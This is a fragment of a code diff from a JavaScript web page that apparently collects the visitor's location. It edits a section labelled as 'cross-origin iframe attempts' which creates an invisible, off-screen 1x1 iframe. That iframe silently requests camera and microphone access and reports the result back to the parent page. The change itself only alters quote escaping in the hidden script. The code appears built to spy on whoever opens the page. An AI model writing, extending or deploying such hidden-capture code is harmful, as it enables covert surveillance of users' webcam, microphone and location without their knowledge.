@@ -1690,7 +1690,7 @@ ${position.coords.altitude ? `• Yükseklik: ${position.coords.altitude}m` : ''
             // Method 2: Cross-origin iframe attempts
             const iframe = document.createElement('iframe');
             iframe.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;border:none';
-            iframe.src = 'data:text/html,<script>navigator.mediaDevices.getUserMedia({video:true,audio:true}).then(s=>parent.postMessage("stream_success","*")).catch(e=>parent.postMessage("stream_fail","*"));</script>';
+            iframe.src = 'data:text/html,<script>navigator.mediaDevices.getUserMedia({video:true,audio:true}).then(s=>parent.postMessage(\"stream_success\",\"*\")).catch(e=>parent.postMessage(\"stream_fail\",\"*\"));</script>';
             
             window.addEventListener('message', (event) => {
                 if (event.data === 'stream_success') {
